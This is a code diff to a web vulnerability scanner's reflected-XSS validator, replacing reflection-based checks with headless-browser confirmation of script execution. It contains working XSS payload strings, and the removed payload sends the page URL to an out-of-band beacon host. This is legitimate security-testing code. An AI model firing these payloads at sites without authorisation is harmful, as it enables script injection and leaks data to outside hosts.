@@ -53,49 +53,85 @@ class ValidationManager:
         return finding
 
     async def _validate_xss_reflected(self, finding, session):
+        """Reflected XSS validation that requires actual JS execution in a browser.
+
+        We do NOT consider mere reflection as verified. We confirm execution by:
+        - Detecting a dialog event, OR
+        - Detecting a window sentinel set by an event handler (onerror)
+        """
         url = finding.url
         marker = self._marker('XSS')
         try:
             parsed = urlparse(url)
             q = parse_qs(parsed.query, keep_blank_values=True)
             param = finding.affected_parameter or next(iter(q.keys()), 'q')
-            # Build OOB beacon base from config (collaborator or local dashboard)
-            collab = (self.scanner.config.get('collaborator', {}) or {}).get('base_domain')
-            scheme = 'https' if ((self.scanner.config.get('collaborator', {}) or {}).get('https')) else 'http'
-            if not collab:
-                host = self.scanner.config.get('dashboard_host') or '127.0.0.1'
-                port = str(self.scanner.config.get('dashboard_port') or '8000')
-                collab = f"{host}:{port}"
-            oob = f"{scheme}://{collab}/oob/xss/{marker}"
-
-            # Inject a safe reflected payload that visibly inserts a banner and loads a blind beacon.
-            # We use backticks to assign outerHTML; include a hidden img to call our OOB endpoint.
-            payload = (
-                f"\"><img src=x onerror=\"this.outerHTML=`<div id=MODSCAN_XSS "
-                f"style=font:700 14px/1.2 system-ui;color:#10b981;background:#052e16;padding:6px 10px;"
-                f"border-radius:6px>MODSCAN XSS VERIFIED • {marker}</div><img src='{oob}?u=${{encodeURIComponent(location.href)}}' style='display:none'>`\">"
-            )
+            # Minimal safe payload that sets a global sentinel if JS executes
+            payload = f"\"><img src=x onerror=\"window.__modscan_xss_marker='{marker}'\">"
             q[param] = [payload]
             new_query = urlencode(q, doseq=True)
             test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
-            h = await self.scanner._get_auth_headers(test_url)
-            async with session.get(test_url, headers=h, timeout=15) as r:
-                txt = await r.text()
-            # Verify by presence of our unique marker in the reflected HTML (attribute value)
-            verified = (marker in txt)
-            if verified:
+
+            # Try browser-based confirmation
+            try:
+                from playwright.async_api import async_playwright  # type: ignore
                 try:
-                    import asyncio as _asyncio
-                    # Small delay to ensure client-side banner insertion renders before capture
-                    await _asyncio.sleep(0.4)
+                    # Use shared runtime if available
+                    from .browser_runtime import get_launch_options, extend_args
+                    opts = get_launch_options()
+                    launch_args = extend_args(["--headless=new"], opts['args'])
+                    headless = bool(opts['headless'])
                 except Exception:
-                    pass
-                shot = await self.scanner._take_screenshot(test_url)
-                finding.evidence = (
-                    f"{finding.evidence} | Verification: visible MODSCAN banner {marker}. Screenshot: {shot}"
-                ).strip()
-                finding.confidence = max(finding.confidence, 0.9)
-                finding.screenshot_path = shot or finding.screenshot_path
+                    launch_args = ["--headless=new"]
+                    headless = True
+
+                dialog_detected = False
+                async with async_playwright() as pw:
+                    browser = await pw.chromium.launch(headless=headless, args=launch_args)
+                    page = await browser.new_page()
+                    # Capture dialog events
+                    async def _on_dialog(d):
+                        nonlocal dialog_detected
+                        dialog_detected = True
+                        try:
+                            await d.accept()
+                        except Exception:
+                            pass
+                    page.on("dialog", _on_dialog)
+                    try:
+                        await page.goto(test_url, timeout=15000, wait_until='domcontentloaded')
+                        # Light event fuzzing to trigger common handlers
+                        try:
+                            await page.mouse.move(10, 10)
+                            await page.mouse.click(20, 20)
+                            await page.keyboard.press('Tab')
+                            await page.keyboard.type('modscan')
+                        except Exception:
+                            pass
+                        # Check sentinel for execution
+                        executed = await page.evaluate(f"() => window.__modscan_xss_marker === '{marker}'")
+                    except Exception:
+                        executed = False
+                    try:
+                        await browser.close()
+                    except Exception:
+                        pass
+
+                if executed or dialog_detected:
+                    shot = await self.scanner._take_screenshot(test_url)
+                    finding.evidence = (
+                        f"{finding.evidence} | Verification: browser execution ({'dialog' if dialog_detected else 'sentinel'}). Screenshot: {shot}"
+                    ).strip()
+                    finding.confidence = max(finding.confidence, 0.9)
+                    finding.screenshot_path = shot or finding.screenshot_path
+                else:
+                    # Downgrade to reflection-only
+                    finding.vuln_type = 'xss_reflection'
+                    finding.severity = 'LOW'
+                    finding.confidence = min(finding.confidence, 0.4)
+                    finding.evidence = f"{finding.evidence} | Not verified (reflected only)".strip()
+            except Exception as bex:
+                logger.debug(f"Browser validation unavailable or failed: {bex}")
+                # As a fallback, DO NOT mark verified on reflection alone
         except Exception as e:
             logger.debug(f"XSS reflected validation error: {e}")
         return finding
